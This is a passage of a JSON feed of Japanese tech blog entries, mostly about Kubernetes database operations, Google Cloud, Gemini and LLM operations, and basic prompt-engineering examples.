Kubernetes」セッションは、Kubernetes上でのデータベース運用が成熟期を迎えていることを示しました。ストレージとネットワーキングの進化、Operatorの普及、そして様々な企業での成功事例は、Kubernetesがデータベース運用のための堅牢でスケーラブルなプラットフォームであることを証明しています。クラウドネイティブなアプローチ、セルフサービス化、セキュリティ強化、そして適切なアーキテクチャ設計は、Kubernetes上でのデータベース運用を成功させるための鍵となります。同時に、VM環境からの移行、リソース管理、人材育成といった課題にも適切に対処する必要があります。今後のDBaaSは、Kubernetesとの統合がさらに進み、データベースサービスの利用がより容易になると期待されます。このセッションで得られた知見は、今後のデータベース運用戦略策定に役立つ貴重な情報源となるでしょう。特に、オンプレミスでマイクロサービスアーキテクチャを採用する組織にとって、Kubernetesはデータベース運用における重要な選択肢となるでしょう。↩","isoDate":"2024-12-08T03:00:00.000Z","dateMiliSeconds":1733626800000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"KubeCon NA 2024: When Life Gives You Containers, Make an Open Source RDS: A Kubernetes Love Story のセッションレポート","link":"https://nnaka2992.hatenablog.com/entry/2024/12/11/when_life_gives_you_containers_make_an_open_source_rds_a_kubernetes_love_story","contentSnippet":"この記事は以下アドベントカレンダー11日目の記事です。3-shake Advent Calendar 2024 シリーズ2Kubernetes Advent Calendar 2024 シリーズ1When Life Gives You Containers, Make an Open Source RDS: A Kubernetes Love Story セッションレポートセッション概要:https://kccncna2024.sched.com/event/1i7kn/when-life-gives-you-containers-make-an-open-source-rds-a-kubernetes-love-story-sergey-pronin-perconaセッション動画:https://www.youtube.com/watch?v=0gSSmdNB-Zoこのセッションは、オープンソースRDS、あるいはオープンソースDBaaSをKubernetes上で構築・運用する道のりを、物語風に語っています。セッションを通して、Kubernetes上でデータベースを運用することへの不安や課題を解消し、そのメリットと可能性を提示することを目指していると感じました。なぜKubernetesでデータベースを動かすのか？セッション冒頭では、スピーカーが4年前はKubernetesでデータベースを動かすことに懐疑的だったものの、現在は大きく考えが変わっていることが語られています。その理由として、クラウドニュートラル戦略、コスト削減、そして自動化の3点が挙げられています。特に自動化は、高可用性構成、Blue/Greenデプロイ、フェイルオーバーなどを容易にする点で重要です。これらのメリットは、マイクロサービスアーキテクチャやクラウドネイティブ開発において、データベース運用を効率化し、DevOps実践を促進する上で大きな力となります。従来の運用では、データベースのデプロイや管理に多くの手作業が必要でしたが、Kubernetesと自動化ツールを組み合わせることで、これらの作業を大幅に簡素化し、開発スピードの向上に貢献できます。一方、Kubernetes上でのデータベース運用に対する懸念として、パフォーマンスの劣化、Kubernetes自体の成熟度、そして複雑さが挙げられています。これらの懸念は、データベースエンジニアとして当然抱くものであり、セッション全体を通してこれらの懸念への回答が提示されています。このセクションでは、Kubernetes上でデータベースを運用する上でのメリットと課題が明確に示されており、導入を検討する上で重要なポイントが提示されています。特に、クラウドネイティブな環境におけるデータベース運用の重要性が強調されていました。また単純なメリット・デメリット以上にユーザーの感情面にフォーカスしているところが印象的でした。Chapter 1: Enthusiasm and Kubernetes 101: Kubernetesの基本と進化この章では、Kubernetes上でデータベースを動かすための基本的なステップが段階的に示されています。Pod、Persistent Volume Claim (PVC)、Service、Secret、ConfigMap、StatefulSet、そしてHA構成のためのエージェントとProxyの導入といった流れは、Kubernetesにおけるデータベース運用の進化を理解する上で非常に有用です。特に、StatefulSetの導入は、データベースのようなステートフルアプリケーションの運用において大きな進歩です。Podの順序付けられたデプロイ、安定したネットワークID、永続ストレージへのアクセスなど、StatefulSetが提供する機能は、データベースの高可用性と安定運用に不可欠です。しかし、これらの構成要素を手作業で管理することは複雑でエラーを起こしやすいため、IaCの導入が推奨されています。IaCを用いることで、インフラストラクチャのコード化、自動化、バージョン管理が可能となり、再現性と信頼性の高いデプロイを実現できます。TerraformやAnsible、ArgoCD、HelmなどのIaCツールは、Kubernetesの構成管理を簡素化し、複数環境へのデプロイを容易にします。これは、DevOpsの原則である「Infrastructure as Code」を実践する上で非常に重要なステップです。この章では、Kubernetes上でデータベースを動かすための基本的な構成要素と、IaCの重要性が説明されています。IaCを用いることで、複雑なKubernetes環境を効率的に管理し、再現性と信頼性を向上させることができる点が強調されていました。またIaCのパラメータを変更することで複数環境をデプロイできるところからDBaaSの最初の一歩を踏み出したととらえることができました。Chapter 2: Disillusionment and Operators 101: OperatorによるDay 2 Operationの簡素化IaCによってデプロイは容易になりますが、運用、つまりDay 2 Operationは依然として複雑です。アップグレード、スケーリング、フェイルオーバー、バックアップ、モニタリング、メンテナンス、リカバリといったタスクは、手作業で行うと大きな負担となります。ここでOperatorが登場します。Operatorは、Kubernetesの拡張機能であり、特定のアプリケーションのデプロイと管理を自動化します。データベースOperatorは、データベースのライフサイクル全体を管理し、Day 2 Operationを大幅に簡素化します。Operatorの導入により、データベース管理者はKubernetesの内部構造を深く理解する必要がなくなり、データベース運用に集中できます。これは、運用コストの削減と効率性の向上に大きく貢献します。また、Operatorは宣言的な設定をサポートしており、運用作業の自動化と標準化を促進します。しかし、Operatorだけでは真のDBaaSとは言えません。セルフサービスポータル、マルチクラスタ対応、詳細なモニタリング、課金機能など、DBaaSに必要な機能は多岐に渡ります。この章では、OperatorがDay 2 Operationを簡素化する上で重要な役割を果たすことが説明されています。Operatorは、データベース管理者の負担を軽減し、運用効率を向上させる強力なツールです。これはデータベースエンジニアといわれるロールが採用市場に少ない日本では特に重要な点です。大規模なデータベース運用に合わせてデータベースエンジニアの採用を増やすことは難しいため、様々なツールを利用して負荷を下げ、省力化し、より本質的な業務を行う必要があるためです。一方でOperatorだけではDBaaSの全てをカバーできない点にも注意が必要です。Chapter 3: Hope and DBaaS: Percona Everestの紹介Percona Everestは、オープンソースのDBaaSソリューションであり、Kubernetes上でデータベースサービスを提供します。ReactとMaterial UIで構築された直感的なUI、Golangで実装されたバックエンド、そしてAPIによるアクセスを提供することで、ユーザーフレンドリーな操作性を実現しています。Everestのアーキテクチャは、複数のOperatorをOperator Managerで管理する構造を採用しています。これにより、Operatorのバージョン管理、依存関係の解決、相互運用性の確保が容易になります。ユーザーは、GUIまたはAPIを介してデータベースサービスを操作し、そのリクエストはEverest Operatorによって各データベースOperatorに変換されます。Everestは、オープンソースDBaaSとして、ベンダーロックインを回避し、柔軟なデータベース運用を可能にします。また、コミュニティベースの開発により、迅速な機能追加とバグ修正が期待できます。この章では、Percona EverestがオープンソースDBaaSとして、Kubernetes上でデータベースサービスを提供する仕組みが説明されています。Everestは、ユーザーフレンドリーなUI、Operator ManagerによるOperator管理、そしてオープンソースとしてのメリットを提供することで、柔軟で効率的なデータベース運用を支援します。セッション中ではGUIやAPIは利用しない導入例もあると話されており、個人的にはKubernetesリソースの管理に余計なUIを追加する方法は大規模化したときにデメリットが増えるのではないかと感じました。またこのセッションのスピーカーはPerconaのエンジニアであるためある程度ポジショントークが含まれているであろうことも注意が必要です。Epilogue: Kubernetesとデータベースの未来セッションの締めくくりとして、Kubernetes上でのデータベース運用は困難な側面もあるものの、OperatorやDBaaSソリューションの活用により、効率的でスケーラブルな運用が可能になることが強調されています。Kubernetes上でデータベースを運用することは、もはや一部の先進的な企業だけの選択肢ではなく、一般的な選択肢になりつつあります。クラウドネイティブな環境でデータベースを運用することは、ビジネスの俊敏性と競争力を高める上で重要な要素となります。Kubernetes上でのデータベース運用に対する不安や懸念を解消し、その可能性を示す上で非常に有益な内容でした。Percona EverestのようなオープンソースDBaaSソリューションの登場は、Kubernetesにおけるデータベース運用の楽にする選択肢の一つと言えるでしょう。まとめこのセッションを通して、Kubernetes上でのデータベース運用は、進化を続け、成熟しつつあることが理解できました。初期の懸念は解消されつつあり、OperatorやDBaaSソリューションの登場により、運用効率とスケーラビリティが大幅に向上しています。特に定型的なデプロイと運用を自動化できることでデータベースエンジニアはアプリケーション特性に応じた最適化やリリースマネジメントといったユーザーに価値を提供することを最大化することに注力することができます。今後、Kubernetes上でのデータベース運用はさらに普及し、クラウドネイティブなアプリケーション開発の中核を担うことになるでしょう。一定以上の規模の組織ではオンプレ回帰やクラウドコストの最小化といった観点からKubernetes上にデータベースをホストするソリューションが求められ生ます。そのためデータベースエンジニアは、Kubernetesの基礎知識を習得し、OperatorやDBaaSソリューションの活用方法を学ぶことで、より効率的で本質的な業務を遂行できるようになるはずです。","isoDate":"2024-12-08T02:42:58.000Z","dateMiliSeconds":1733625778000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"バッチ処理をCloud RunからCloud Run jobsに変更してみた話","link":"https://qiita.com/bayobayo0324/items/71f7e19a051261d1adfc","contentSnippet":"この記事は3-shake Advent Calendar 2024 シリーズ1の8日目の記事ですはじめましてあるいはこんにちは、@bayobayo0324 です。株式会社スリーシェイクでクラウド型ETLツール「Reckoner（レコナー）」のプロダクトエンジニアしていま...","isoDate":"2024-12-07T22:06:20.000Z","dateMiliSeconds":1733609180000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"私とJagu\'e\'rと2025年から...","link":"https://blog.masasuzu.net/entry/2024/12/08/000000","contentSnippet":"この記事はJagu\'e\'r Advent Calendar 2024の8日目の記事です。日付的には大遅刻です。特に技術的な話はしません。思い出話とこれからの意気込みを書きます。Jagu\'e\'r(Japan Google Cloud Usergroup for Enterprise) は、Google Cloudのユーザー企業やパートナー企業が集まるユーザー会です。私はパートナー企業であるスリーシェイクに所属し、Jagu\'e\'rに参加しています。実は入会自体は結構前で、メールを遡ると2023年8月10日でした。当時Google Cloudに関わる案件が始まり、情報収集のために登録した記憶があります。しかし、「Enterprise」や「分科会」といった言葉から、何となく堅苦しいイメージを抱いてしまい、Slackには入ったものの、あまり活動には参加していませんでした。転機が訪れたのは、今年2024年の春から夏頃のこと。同僚が分科会の運営に入り、別の同僚もJagu\'e\'rのMeetupで発表するようになったんです。身近な人が関わるようになると、自然と興味が湧いてきて、今年の後半はオンライン・オフライン問わず、Meetupに参加するようになりました。そして先日、Jagu\'e\'r Park \'24 Winter!に参加しました。そこで行われたJagu\'e\'r Award選出のためのピッチ発表に、私は深く感銘を受けました。どの発表者の方も、Jagu\'e\'rコミュニティへの熱い思いや感謝の気持ちが溢れていて、本当に心を動かされました。特に、中外製薬の方とDatadogの方のピッチは強く印象に残っています。これまでJagu\'e\'rコミュニティに深く関わってきませんでしたが、こんなにも熱い思いを持つ人たちと一緒に活動したい！という気持ちが湧き上がってきました。「善は急げ」と、ピッチを聞いたその場で、社内でJagu\'e\'rの分科会運営に携わっている人に連絡を取り、運営を手伝えないか相談しました。さらに懇親会では、弊社担当のGoogle Cloudパートナーエンジニアの方にも相談し、同じ分科会の運営の方につなげてもらいました。問題がなければ、来年から某分科会の運営に携わる予定です。正直なところ、勢いで走り出した部分もあるので、まだ何ができるか、何をしていきたいかは漠然としています。それでも、来年はコミュニティの活性化に貢献できるような成果を残せるよう、精一杯頑張りたいと思っています。","isoDate":"2024-12-07T15:00:00.000Z","dateMiliSeconds":1733583600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Lima+containerd+nerdctlで作るコンテナ環境/lima_containerd_nerdctl","link":"https://speakerdeck.com/moz_sec_/lima-containerd-nerdctl-1","contentSnippet":"","isoDate":"2024-12-07T05:00:00.000Z","dateMiliSeconds":1733547600000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"セキュアな LLM アプリ開発：OWASP Top 10 for LLM 2025 と Vertex AI による実践","link":"https://zenn.dev/kimitsu/articles/owasp-for-llm-2025-and-vertex-ai","contentSnippet":"本記事は 3-shake Advent Calendar 2024 シリーズ 1 の 7 日目の記事です。 はじめにOWASP Top 10 for LLM Applications の 2025 年版が 11 月 18 日に発表されました。[1]OWASP Top 10 は Web アプリケーションのセキュリティリスクの中で最も重要な 10 個をリスト化したものであり、OWASP Top 10 for LLM Applications は名前の通り LLM を利用したアプリケーションに関するものです。本家は数年に一度の改訂ですが、こちらは LLM の技術進歩が早いためほぼ毎年...","isoDate":"2024-12-07T00:14:53.000Z","dateMiliSeconds":1733530493000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"CUDAを利用したプログラムの高速化とNvidia Container Toolkit","link":"https://sreake.com/blog/cuda-nvidia-container-toolkit/","contentSnippet":"はじめに Sreake事業部インターン生の高島陸斗です。インターン生としてSRE技術の調査・検証を行っています。私は、情報系の大学院生で、普段は数値解析に関する研究をしています。学部時代は、今回のブログ内容とも関係する並 […]The post CUDAを利用したプログラムの高速化とNvidia Container Toolkit first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-06T01:51:20.000Z","dateMiliSeconds":1733449880000,"authorName":"Sreake","authorId":"Sreake"},{"title":"「SRE Kaigi 2025」にスリーシェイクのエンジニアが登壇","link":"https://sreake.com/blog/sre_kaigi_2025/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）に在籍するエンジニアが、2025年1月26日（日）に開催される「SRE Kaigi 2025」にセッション登壇することをお知らせします。The post 「SRE Kaigi 2025」にスリーシェイクのエンジニアが登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-12-05T01:00:00.000Z","dateMiliSeconds":1733360400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"argocd コマンドで別ブランチとの差分を確認する","link":"https://qiita.com/yteraoka/items/aea03d50288375f85183","contentSnippet":"ArgoCD の GitOps で Merge 前に manifest の差分を見たいArgoCD は Application リソースで source に指定した Git などの定義と実際に Kubernetes クラスタにデプロイされている manifest の差分...","isoDate":"2024-12-03T15:14:17.000Z","dateMiliSeconds":1733238857000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"LLMのモデル更新や廃止による影響を考える","link":"https://shu-kob.hateblo.jp/entry/2024/12/03/232856","contentSnippet":"この記事は、MLOps（LLMOps、生成AIOps） Advent Calendar 2024 4日目の記事です。生成AIの普及により、アプリケーションに組み込んで実運用を始めた方も増えてきたと思います。LLMOpsをする中で気をつけたいことを考えてみました。モデルの更新まず、思い浮かぶのがモデルの更新よる影響です。モデルの更新によって性能が上がるなどのメリットを享受できる反面、挙動変更によって、困ることもあります。私の場合、システムの実運用では無いですが、LLM技術書のサンプルコードが動かなくなる事態がありました。06_agent/agent_5.py で2回目の実行結果が正しく表示されません \xb7 Issue #3 \xb7 harukaxq/langchain-book \xb7 GitHubgpt-3.5-turboをAgentとして使用したときの挙動が変わったという内容です。アプリに組み込んでいたら、機能が使えなくなる可能性があり、使えなくなった場合の代替案も用意しておく必要があると考えました。また、LLMのリリース情報もウォッチしておく必要があるでしょう。Geminiはリリースの最新情報を日本語で提供しています。gemini.google.comChatGPTはリリースノートを英語のみですが提供しています。ChatGPT — Release Notes | OpenAI Help CenterAnthropic製品（Claude）のリリースノートは日本語で提供されています。docs.anthropic.comモデルの廃止モデルの廃止もウォッチする必要があるでしょう。GPT-3.5 Turbo終了はニュースになりました。xtech.nikkei.com↑日経クロステックの有料会員記事ですが、会員でなくても1ページ目で内容は把握できます。learn.microsoft.comAzure OpenAIでは、GPTの各種マイナーバージョンが提供されていますが、適宜廃止になるので注意が必要です。廃止になる場合、モデルのVersion UPが必要なので、早めに開発環境でVersion UPしたモデルの挙動確認をする必要があるでしょう。Version UPしたモデルだと、LLMの利用料が高くなることも念頭に置いて、コスト試算しましょう。まとめモデル更新や廃止を早く知るために、LLM公式サイトのリリースノートなどのウォッチをして、早めに対策をしましょう。","isoDate":"2024-12-03T14:28:56.000Z","dateMiliSeconds":1733236136000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Transformer論文を生成AIで要約してみた","link":"https://shu-kob.hateblo.jp/entry/2024/12/02/233507","contentSnippet":"この記事は生成AI Advent Calendar 2024の3日目の記事です。AIの歴史は60年ほどで、「冬の時代」と呼ばれる停滞期もありましたが、昨今の生成AIの発展は「Transformer」と呼ばれる論文から始まりました。この「Transformer」論文をわかりやすいように生成AIに要約させてみました。arxiv.org「Transformer」論文は上記サイトで見ることができます。論文の正式名称は「Attention Is All You Need」で、現在 v7。右側のAccess Paper:から閲覧することができます。なお、PDFの直リンクはこちらGoogle CloudのVertex AIでGeminiに要約させた結果は以下です。プロンプト「この論文を日本語で高校3年生レベルにもわかるように要約してください。」この論文は、「Transformer」という、機械翻訳などのシーケンス変換タスクに革新をもたらした新しいニューラルネットワークアーキテクチャを提案しています。高校3年生にもわかるように要約すると、以下のようになります。従来の機械翻訳の問題点:従来の機械翻訳は、RNN（再帰型ニューラルネットワーク）という技術を主に使っていました。RNNは文章を単語ごとに順番に処理していくため、長い文章だと処理に時間がかかります。また、並列処理が難しいため、計算速度を上げるのが困難でした。Transformerの革新的な点:Transformerは、「Attention（注意機構）」という仕組みに完全に基づいており、RNNのような順番に処理する仕組みを完全に排除しました。Attention機構は、翻訳したい単語を生成する際に、入力文全体の中でどの単語に注目すべきかを判断する仕組みです。人間の翻訳作業で例えると、翻訳する際に原文の関連する部分に注目するのと同じような働きをします。この仕組みにより、以下の利点が生まれました。並列処理が可能: 単語を順番に処理する必要がないため、並列処理が可能になり、計算速度が大幅に向上しました。長い文章への対応力向上: RNNでは、文章が長くなるほど精度が落ちやすいという問題がありましたが、Attention機構は入力文全体を一度に見ることができるため、長い文章でも高い精度を維持できます。Transformerの成果:Transformerは、従来のモデルよりも高い精度を達成し、さらに学習時間も大幅に短縮しました。具体的には、英語からドイツ語への翻訳と英語からフランス語への翻訳タスクで、当時の最高精度を更新しました。Transformerの仕組みを簡単に説明すると:Transformerは、エンコーダとデコーダという2つの部分から構成されています。エンコーダ: 入力文を解析し、各単語の意味をベクトル表現に変換します。デコーダ: エンコーダの出力とAttention機構を利用して、翻訳文を生成します。エンコーダとデコーダは、それぞれ複数の層が積み重なった構造になっています。各層は、Attention機構と全結合層という2つのサブ層から構成されています。Transformerの今後の展望:Transformerは、テキスト以外のデータ（画像、音声、動画など）にも応用できる可能性があり、様々な分野での活用が期待されています。また、文章生成をより効率的に行うための研究も進められています。簡単に言うと、Transformerは、人間の「注意」の仕組みに似た仕組みを使って、従来よりも高速で高精度な機械翻訳を実現した画期的な技術です。","isoDate":"2024-12-02T14:35:07.000Z","dateMiliSeconds":1733150107000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2025年の崖から考える我々のパーパス（序章）","link":"https://shu-kob.hateblo.jp/entry/2024/12/01/232229","contentSnippet":"はじめにこの記事は3-shake Advent Calendar 2024 シリーズ1の2日目の記事です。1日目はシリーズ1がYutaro ShirayamaさんのポストCloud9？クラウドIDE CoderでPlatform Engineeringを実践する2日目はシリーズ2がYoshinori Teraokaさんのvector で kubernetes の container log を CloudWatch Logs に転送するでした。なお、シリーズ2の2日目はshingo919さんの 九州旅行記（ドライブでの九州一週旅行は大変だった！）です。2025年の崖今回は「2025年の崖」について軽くご紹介したいと思います。いよいよ2025年になりますが、ITでは「2025年の崖」という言葉が存在します。2025年の崖がある中で、スリーシェイクのSreake事業部が果たす役割を考えていきたいと思います。「2025年の崖」をググったら色々出てきますが、経済産業省のレポートが1次情報源的かつわかりやすいでしょう。www.meti.go.jpなお、DXレポート ～ITシステム「2025年の崖」の克服とDXの本格的な展開～（サマリー）はスライド5枚にまとまっており、さっと読みやすいです。「2025年の崖」は要するに何なのかというと、IT人材が不足しており、レガシーシステムを保守するのに限界が来ている。DXも推進しないといけない。何とかしないともう後が無い。という状況。2015年時点で、IT人材の不足が約17万人とされていたところ、2025年には約43万人にまで上ります。既存のレガシーシステムの保守がブラックボックス、属人的になっており、DX化の足枷に → デジタル競争の敗者に技術的負債が溜まる一方保守運用の担い手不足で、サイバーセキュリティ事故が起きやすくこんな厳しい状況を打破するには、ユーザとベンダーそれぞれで対策していく必要があります。ユーザは人材・資金を保守からDXにシフトベンダーも同様に人材・資金を保守からDXにシフトベンダーはAI、アジャイル、マイクロサービス等最新技術を用いたビジネスにシフトやることはわかっていても、そう簡単にはいきません。ただし、スリーシェイクのSreake事業では、内製化支援も行っており、これまで数々の企業様の支援を行ってまいりました。Sreakeという商材は難しく、入社して1年が経った私もストンと腹落ちできる説明ができないままでしたが、「2025年の崖」をどう克服するかが我々のパーパスだと感じました。私は生成AIアプリケーション開発支援というDXを担当しておりますが、案件の推進を通して、「DX推進」を語れるようになっていきたいと思います。今回は、序章のような形で今後も2025年の崖について書いていければと思います。次の3-shake Advent Calendar 2024はシリーズ1がkechigonさんの「Google Cloud monitoringのアラートをGitHub issueに通知する」シリーズ2がtryu___さんの「kubebuilder使ってpodの監視してみた」です。","isoDate":"2024-12-01T14:22:29.000Z","dateMiliSeconds":1733062949000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"vector で kubernetes の container log を CloudWatch Logs に転送する","link":"https://qiita.com/yteraoka/items/df0777cdcb403a7af750","contentSnippet":"Vector とはvector は timber とともに買収され datadog がメンテナンスしているオープンソースプロジェクトのようです。(Datadog acquires Timber Technologies)A lightweight, ultra-fas...","isoDate":"2024-12-01T12:20:46.000Z","dateMiliSeconds":1733055646000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Geminiのビジネス利用でのメリットを語る","link":"https://shu-kob.hateblo.jp/entry/2024/11/30/233039","contentSnippet":"この記事はGCP(Google Cloud Platform) Advent Calendar 2024 1日目の記事です。2024年はIT業界にとって、最も話題に上がったトピックは生成AIだったのではないでしょうか？2023年までは生成AIと家は、ChatGPTでしたが、2024年はGoogleがBardをリブランディングして、Gemini（ジェミニ）とし、しのぎを削っています。私はGoogle Cloudのパートナー企業である株式会社スリーシェイク Sreake事業部にて、Geminiを用いた生成AIアプリケーション開発に携わっており、Geminiのビジネス利用でのメリットを語りたいと思います。Gemini-1.5-Proは最大200万トークンの読み込みが可能Geminiの強みの中で、最も他の生成AIモデルと差別化できているのが、トークン数の長さです。これにより、動画解析などへの利用もしやすくなりました。Geminiはマルチモーダルなので、音声、画像、動画なども処理可能です。量の目安としては以下になります。書籍15〜20冊程度の分量動画約2時間音声約22時間BigQueryで容易にデータ分析基盤を構築可能他のクラウドには同様のサービスがなく、同じ機能を実現するためには複数のサービスを組み合わせる必要があります。AzureやAWS、オンプレのデータはそのままで読み込みだけ行う機能もあります。今お使いのシステム構成はほぼ変えず、追加構築可能となります。Geminiは他のモデルと比較してトークンあたりの利用料が安いGoogle Cloud上で稼働させるのに最適化しているためです。他社のクラウドで使える生成AIモデルは別会社のものなので、クラウドも生成AIもGoogleのGeminiによって、この点も強みです！もしもGeminiの出力結果が著作権侵害で係争が発生してもGoogle Cloudがサポート他クラウドにはないサービスです。こちらも、クラウドも生成AIも会社が揃っている強みと言えるでしょう。真実性1位！Gemini 1.5 ProがNIKKEI Digital Governanceが調査した真実性のスコアで1位となりました！以下の記事は最初日経で見れていたと思うのですが、今はNIKKEI Digital Governanceに登録しないと見れないようです。博識のGoogle､主観強いMeta　生成AIの｢真実性｣を検証上記画像は下記記事から引用させていただきました。note.com2024年もあと少し。2025年もGeminiとともに生成AIを盛り上げていきたいと思います！GCP(Google Cloud Platform) Advent Calendar 2024 次の記事はknak72さんによる企業のセキュリティ強化に！ Chrome Enterprise Premium のURLフィルタリングとマルウェアスキャン機能です。","isoDate":"2024-11-30T14:30:39.000Z","dateMiliSeconds":1732977039000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイク、Google Cloud Japan の「 Google Cloud Partner Top Engineer 2025 」にて3名のエンジニアが受賞","link":"https://sreake.com/blog/%e3%82%b9%e3%83%aa%e3%83%bc%e3%82%b7%e3%82%a7%e3%82%a4%e3%82%af%e3%80%81google-cloud-japan-%e3%81%ae%e3%80%8c-google-cloud-partner-top-engineer-2025-%e3%80%8d%e3%81%ab%e3%81%a63%e5%90%8d%e3%81%ae/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）のエンジニア3名が、Google Cloud Japan が高い技術力を持ったエンジニアを表彰するプログラムである「 Google Cloud Partner Top Engineer 2025 」に選出されたことをお知らせします。The post スリーシェイク、Google Cloud Japan の「 Google Cloud Partner Top Engineer 2025 」にて3名のエンジニアが受賞 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-28T06:03:47.000Z","dateMiliSeconds":1732773827000,"authorName":"Sreake","authorId":"Sreake"},{"title":"3-shake における組織的な Google Cloud Partner Top Engineer 推進について","link":"https://sreake.com/blog/google-cloud-partner-top-engineer-2025/","contentSnippet":"はじめに 3-shakeで、Engineering Team Lead / SRE をやっている横尾（@866mfs）です 今回、3-shake では、佐藤 慧太(@SatohJohn), 横尾 杏之介(@866mfs) […]The post 3-shake における組織的な Google Cloud Partner Top Engineer 推進について first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-28T06:00:00.000Z","dateMiliSeconds":1732773600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"コミュニティ紹介: Kubernetes Meetup Novice","link":"https://speakerdeck.com/bells17/komiyuniteishao-jie-kubernetes-meetup-novice","contentSnippet":"Cloud Native Days Winter 2024のCommunity & Beginner LTでお話した資料です。\\r\\rhttps://pfem.notion.site/CNDW2024-Community-Beginner-LT-13821b0141e0800cb403c880cb4d2738","isoDate":"2024-11-28T05:00:00.000Z","dateMiliSeconds":1732770000000,"authorName":"bells17","authorId":"bells17"},{"title":"メインテーマはKubernetes","link":"https://speakerdeck.com/nwiizo/meintemahakubernetes","contentSnippet":"2024年16:20-17:00（Track A）にて「メインテーマはKubernetes」というタイトルで登壇します。\\r\\rイベント名: Cloud Native Days Winter 2024\\r\\r公式URL:https://event.cloudnativedays.jp/cndw2024/\\r\\rセッションURL:https://event.cloudnativedays.jp/cndw2024/talks/2373","isoDate":"2024-11-28T05:00:00.000Z","dateMiliSeconds":1732770000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"KubeCon + Cloud NativeCon North America 参加レポート","link":"https://sreake.com/blog/kubecon-cloud-nativecon-north-america-2024-report/","contentSnippet":"はじめに こんにちは！3-shak inc, で SRE をやっている横尾(@866mfs)です。 2024/11/12 ~ 2024/11/15 に開催された、\xa0KubeCon + CloudNativeCo […]The post KubeCon + Cloud NativeCon North America 参加レポート first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-27T00:28:01.000Z","dateMiliSeconds":1732667281000,"authorName":"Sreake","authorId":"Sreake"},{"title":"社内活動の取り組み紹介~ スリーシェイクでこんな取り組みしてます ~","link":"https://speakerdeck.com/bells17/she-nei-huo-dong-noqu-rizu-mishao-jie-surisieikudekonnaqu-rizu-misitemasu","contentSnippet":"CloudNative Days Winter 2024 船上LT会 小さな一歩、大きな飛躍〜クラウドネイティブを継続する〜 で発表したLT資料です。\\rhttps://cloudnativedays.connpass.com/event/334620/","isoDate":"2024-11-26T05:00:00.000Z","dateMiliSeconds":1732597200000,"authorName":"bells17","authorId":"bells17"},{"title":"[S3 Intelligent-Tiering]概要とTerraformでの実装","link":"https://zenn.dev/takehiro1111/articles/s3_intelligent_tiering","contentSnippet":"0.本記事を書いている経緯業務でS3周りのコスト削減の一環としてS3 Intelligent-Tierringの設定を行う予定だが、その前段階で導入に必要なコストや懸念点を調査している。その過程で自身の備忘録として残しています。 1.概要(参照) 1-1.設定する目的S3に関連するコスト削減を行いたいため。どのオブジェクトがどの程度使用されるか判断がつかない状態で、安易にライフサイクルポリシーでGracierへ移行したり出来ないため、AWS側でアクセスパターンを検知し、オブジェクトを最適な階層へ移行してくれる。 1-2.機能Amazon S3 のストレ...","isoDate":"2024-11-24T07:24:48.000Z","dateMiliSeconds":1732433088000,"authorName":"takehiro1111","authorId":"takehiro1111"},{"title":"Reckoner における Datadog Browser Test の活用事例 / Datadog Browser Test at Reckoner","link":"https://speakerdeck.com/nomadblacky/datadog-browser-test-at-reckoner","contentSnippet":"Japan Datadog User Group Meetup#6\\rhttps://datadog-jp.connpass.com/event/334594/","isoDate":"2024-11-20T05:00:00.000Z","dateMiliSeconds":1732078800000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"プロンプトエンジニアリングハンズオン","link":"https://shu-kob.hateblo.jp/entry/2024/11/19/172452","contentSnippet":"genai-users.connpass.com↑上記勉強会の資料です。shu-kob.hateblo.jp↑こちらの記事の「プロンプトエンジニアリング」もご覧ください。（上記記事はChatGPT）先ずは復習してみましょうGeminiにアクセスgemini.google.comお好みで、ChatGPTやClaudeを使用しても構いません。プロンプトエンジニアリングJSON形式で出力カレーのレシピを教えてください。出力は以下のJSON形式にしてください。==============={  \\"材料\\": [\\"材料1\\", \\"材料2\\"],  \\"手順\\": [\\"手順1\\", \\"手順2\\"]}==============={  \\"材料\\": [    \\"玉ねぎ 1個\\",    \\"にんじん 1本\\",    \\"じゃがいも 2個\\",    \\"牛肉 300g\\",    \\"カレールー 2箱\\",    \\"サラダ油 大さじ2\\",    \\"水 800ml\\",    \\"塩 少々\\",    \\"こしょう 少々\\"  ],  \\"手順\\": [    \\"玉ねぎ、にんじん、じゃがいもは食べやすい大きさに切る。\\",    \\"鍋にサラダ油を熱し、牛肉を炒め、色が変わったら玉ねぎを加えて炒める。\\",    \\"にんじん、じゃがいもを加えてさらに炒める。\\",    \\"水を加え、アクを取りながら煮込む。\\",    \\"野菜が柔らかくなったらカレールーを加えて溶かす。\\",    \\"塩こしょうで味を調え、5分ほど煮込む。\\"  ]}出力結果をJSON Formatterで確認JSON Formatter & ValidatorZero-shotプロンプティングZero-Shotプロンプティングとは、大規模言語モデル（LLM）に対して、事前に具体的な例を示すことなく、一度の指示でタスクを実行させるプロンプトエンジニアリング手法です。以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================紅白出場歌手の選考基準 